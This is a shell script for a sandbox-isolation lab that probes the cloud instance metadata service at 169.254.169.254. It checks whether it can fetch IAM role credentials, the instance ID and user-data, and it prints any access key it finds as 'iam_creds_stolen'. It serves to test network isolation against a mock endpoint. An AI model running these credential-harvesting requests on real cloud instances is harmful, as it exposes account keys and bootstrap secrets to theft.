#!/bin/sh
# Lab 05: Cloud Metadata SSRF probe
#
# Runs inside BOTH Docker and void-box to compare access to the cloud
# instance metadata service. Outputs structured key=value pairs for assertions.
#
# In Docker: the metadata endpoint (served by a mock container) is reachable
# via the Docker bridge network.
# In void-box: SLIRP networking isolates the VM — the metadata IP is unreachable.
#
# POSIX sh + busybox-compatible only (works in alpine and void-box initramfs).

METADATA_URL="${METADATA_URL:-http://169.254.169.254}"

# --- Can we reach the metadata endpoint? ---
METADATA_REACHABLE="NO"
METADATA_BODY=""
if command -v wget >/dev/null 2>&1; then
    METADATA_BODY=$(wget -q -O- -T 3 "$METADATA_URL/latest/meta-data/" 2>/dev/null) || true
elif command -v curl >/dev/null 2>&1; then
    METADATA_BODY=$(curl -s --max-time 3 "$METADATA_URL/latest/meta-data/" 2>/dev/null) || true
fi

if [ -n "$METADATA_BODY" ]; then
    METADATA_REACHABLE="YES"
fi
echo "metadata_reachable=$METADATA_REACHABLE"

# --- Can we get IAM credentials? ---
IAM_CREDS="NO"
IAM_ACCESS_KEY=""
if [ "$METADATA_REACHABLE" = "YES" ]; then
    ROLE=""
    if command -v wget >/dev/null 2>&1; then
        ROLE=$(wget -q -O- -T 3 "$METADATA_URL/latest/meta-data/iam/security-credentials/" 2>/dev/null) || true
    elif command -v curl >/dev/null 2>&1; then
        ROLE=$(curl -s --max-time 3 "$METADATA_URL/latest/meta-data/iam/security-credentials/" 2>/dev/null) || true
    fi

    if [ -n "$ROLE" ]; then
        CREDS_BODY=""
        if command -v wget >/dev/null 2>&1; then
            CREDS_BODY=$(wget -q -O- -T 3 "$METADATA_URL/latest/meta-data/iam/security-credentials/$ROLE" 2>/dev/null) || true
        elif command -v curl >/dev/null 2>&1; then
            CREDS_BODY=$(curl -s --max-time 3 "$METADATA_URL/latest/meta-data/iam/security-credentials/$ROLE" 2>/dev/null) || true
        fi

        if echo "$CREDS_BODY" | grep -q "AccessKeyId" 2>/dev/null; then
            IAM_CREDS="YES"
            IAM_ACCESS_KEY=$(echo "$CREDS_BODY" | grep "AccessKeyId" | sed 's/.*: *"//;s/".*//' | head -1)
        fi
    fi
fi
echo "iam_creds_stolen=$IAM_CREDS"
echo "iam_access_key=$IAM_ACCESS_KEY"

# --- Can we get instance identity? ---
INSTANCE_ID=""
if [ "$METADATA_REACHABLE" = "YES" ]; then
    if command -v wget >/dev/null 2>&1; then
        INSTANCE_ID=$(wget -q -O- -T 3 "$METADATA_URL/latest/meta-data/instance-id" 2>/dev/null) || true
    elif command -v curl >/dev/null 2>&1; then
        INSTANCE_ID=$(curl -s --max-time 3 "$METADATA_URL/latest/meta-data/instance-id" 2>/dev/null) || true
    fi
fi
if [ -n "$INSTANCE_ID" ]; then
    echo "instance_id=$INSTANCE_ID"
else
    echo "instance_id=none"
fi

# --- Can we get user-data (often contains bootstrap secrets)? ---
USERDATA="NO"
if [ "$METADATA_REACHABLE" = "YES" ]; then
    USERDATA_BODY=""
    if command -v wget >/dev/null 2>&1; then
        USERDATA_BODY=$(wget -q -O- -T 3 "$METADATA_URL/latest/user-data" 2>/dev/null) || true
    elif command -v curl >/dev/null 2>&1; then
        USERDATA_BODY=$(curl -s --max-time 3 "$METADATA_URL/latest/user-data" 2>/dev/null) || true
    fi
    if [ -n "$USERDATA_BODY" ]; then
        USERDATA="YES"
    fi
fi
echo "userdata_accessible=$USERDATA"

# --- Environment info ---
echo "probe_hostname=$(hostname)"
echo "probe_kernel=$(uname -r)"
